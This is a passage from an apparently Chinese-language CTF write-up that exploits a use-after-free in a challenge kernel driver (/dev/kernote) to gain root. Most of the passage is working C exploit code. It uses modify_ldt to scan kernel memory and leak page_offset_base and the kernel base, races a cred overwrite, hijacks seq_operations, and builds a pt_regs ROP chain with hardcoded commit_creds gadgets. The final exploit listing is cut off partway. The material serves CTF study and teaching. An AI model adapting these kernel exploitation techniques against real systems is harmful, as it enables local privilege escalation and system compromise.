class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//chunkEdit(cred_addr + 4);</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval) <span class="comment">// child&#x27;s child</span></span><br><span class="line">        &#123;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkAdd(i);</span><br><span class="line">            chunkSet(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkDel(i);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                chunkEdit(cred_addr + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        desc.limit = <span class="number">0</span>;</span><br><span class="line">        desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        desc.contents = <span class="number">0</span>;</span><br><span class="line">        desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        desc.lm = <span class="number">0</span>;</span><br><span class="line">        desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        desc.useable = <span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">        sleep(<span class="number">114514</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())</span><br><span class="line">        errExit(<span class="string">&quot;FAILED TO GET THE ROOT!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] SUCCESSFUL to get the ROOT, execve ROOT SHELL soom...\033[0m&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打远程的脚本可以参照 kbrop 的</p></blockquote><p>不一定能一次成功，有的时候需要多试几次，笔者个人推测应当是 freelist 随机化的缘故</p><p><img src="https://i.loli.net/2021/10/31/QI7FzGx3RYDlPfE.png" alt="image.png"></p><h3 id="解法二：劫持-seq-operations-利用-pt-regs-进行-ROP-完成稳定化提权"><a href="#解法二：劫持-seq-operations-利用-pt-regs-进行-ROP-完成稳定化提权" class="headerlink" title="解法二：劫持 seq_operations 利用 pt_regs 进行 ROP 完成稳定化提权"></a>解法二：劫持 seq_operations 利用 pt_regs 进行 ROP 完成稳定化提权</h3><p>这个解法是笔者<strong>结合官方的解法与冠军战队 organizers 的解法得来的新解法</strong>，前面两步基本上和官方解法是一样的，都是利用 modify_ldt 系统调用读取内核空间的数据，不同的是笔者在这一步中选择读出内核“堆”上存储的指针以泄露内核基址，最后劫持 seq_operations 进行稳定化提权</p><h4 id="Step-I-泄露-page-offset-base-1"><a href="#Step-I-泄露-page-offset-base-1" class="headerlink" title="Step I. 泄露 page_offset_base"></a>Step I. 泄露 page_offset_base</h4><p>和解法一相同，利用 read_ldt() 与 copy 系函数不会引起 kernel panic 的特性爆破内核的“堆”区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-泄露内核基址"><a href="#Step-II-泄露内核基址" class="headerlink" title="Step II. 泄露内核基址"></a>Step II. 泄露内核基址</h4><p>这一步和解法一的 step II 相同，不同的是笔者在这一步通过子进程获取到内核“堆”上数据后并非用以搜索 task_struct 地址，而是尝试<strong>找到属于内核的函数指针，以此泄露内核基址</strong></p><p>经过笔者调试发现 <code>内核基址 + 0x40</code> 这个地址经常在内核“堆”一开头不远的地方就会出现（尚未验证具体为何指针），故笔者选择以该数据来计算内核基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%lx\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>经笔者本地多次实验，这个地址<strong>总会出现在内核“堆”的 0x9d000 偏移处</strong>，或许我们总能从该地址稳定地泄露出内核的基址？</p></blockquote><h4 id="Step-III-利用-seq-operations-pt-regs-结构体完成稳定化-ROP-进行提权"><a href="#Step-III-利用-seq-operations-pt-regs-结构体完成稳定化-ROP-进行提权" class="headerlink" title="Step III. 利用 seq_operations + pt_regs 结构体完成稳定化 ROP 进行提权"></a>Step III. 利用 seq_operations + pt_regs 结构体完成稳定化 ROP 进行提权</h4><blockquote><p>参照了今年的冠军战队 Organizers 的 <a href="https://ctftime.org/writeup/30589">WP</a>，十分美妙的一种解法！</p></blockquote><p>现在有了内核基址，我们又能分配 0x20 大小的 object，这个大小有个结构体相信大家都十分熟悉——<code>seq_operations</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其 <code>start</code> 指针<strong>既是我们可以控制的，也是我们可以触发的</strong>，我们只需要打开 <code>/proc/self/stat</code> 文件进行读取即可触发该指针，这让我们很轻松地就能控制内核执行流</p><p>接下来我们来考虑如何仅使用一个指针便能完成 ROP 的流程，这里需要用到一个叫做 pt_regs 的结构体，该结构体的<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是一个十分有趣的结构体，我们观察到其各字段命名使用的<strong>全都是寄存器的名称</strong>，这是因为该结构体与系统调用的流程有关，内核中处理系统调用的入口函数为 <code>entry_SYSCALL_64</code>，其源码中有着<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底：</p><p>[<img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png">](</p><p>我们不难想到的是，当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 进行栈迁移便能够完成 ROP</strong></li></ul><h4 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff8266b780</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810ca2b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810c9dd0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81075c4c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"><span class="type">long</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                kernel_base;</span><br><span class="line">    <span class="type">size_t</span>              kernel_offset;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">size_t</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>); <span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span 